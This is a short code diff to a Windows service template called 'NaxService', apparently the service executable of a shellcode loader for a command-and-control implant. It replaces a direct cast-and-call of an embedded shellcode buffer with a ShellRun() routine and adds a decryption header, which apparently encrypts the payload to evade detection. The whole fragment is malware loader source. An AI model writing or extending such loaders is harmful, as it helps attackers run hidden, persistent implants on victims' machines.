@@ -1,5 +1,6 @@
 #include <Nax.h>
 #include <Shellcode.h>
+#include <Decrypt.h>
 
 #ifndef NAX_SVC_NAME
 #define NAX_SVC_NAME L"NaxService"
@@ -16,8 +17,7 @@ VOID WINAPI ServiceCtrlHandler( DWORD Ctrl );
 VOID RunNax( VOID );
 
 VOID RunNax( VOID ) {
-    VOID ( *Nax )( VOID ) = ( decltype( Nax ) )Shellcode::Data;
-    Nax();
+    ShellRun();
 }
 
 VOID WINAPI ServiceCtrlHandler( DWORD Ctrl ) {
